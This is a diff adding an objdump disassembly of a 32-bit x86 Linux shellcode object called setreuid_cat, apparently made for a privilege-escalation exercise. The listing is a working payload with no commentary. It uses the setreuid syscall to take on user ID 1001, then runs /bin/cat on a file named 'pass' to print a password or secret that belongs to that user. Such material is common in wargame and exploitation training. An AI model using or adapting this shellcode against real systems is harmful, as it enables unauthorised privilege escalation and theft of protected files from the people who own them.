@@ -1,0 +1,29 @@
+
+setreuid_cat.o:     file format elf32-i386
+
+
+Disassembly of section .text:
+
+00000000 <setreuid_cat>:
+   0:	31 c0                	xor    eax,eax
+   2:	b0 46                	mov    al,0x46
+   4:	31 db                	xor    ebx,ebx
+   6:	66 bb e9 03          	mov    bx,0x3e9
+   a:	66 31 c9             	xor    cx,cx
+   d:	66 b9 e9 03          	mov    cx,0x3e9
+  11:	cd 80                	int    0x80
+  13:	31 c0                	xor    eax,eax
+  15:	50                   	push   eax
+  16:	68 2f 63 61 74       	push   0x7461632f
+  1b:	68 2f 62 69 6e       	push   0x6e69622f
+  20:	89 e3                	mov    ebx,esp
+  22:	50                   	push   eax
+  23:	68 70 61 73 73       	push   0x73736170
+  28:	89 e2                	mov    edx,esp
+  2a:	50                   	push   eax
+  2b:	52                   	push   edx
+  2c:	53                   	push   ebx
+  2d:	89 e1                	mov    ecx,esp
+  2f:	89 c2                	mov    edx,eax
+  31:	b0 0b                	mov    al,0xb
+  33:	cd 80                	int    0x80
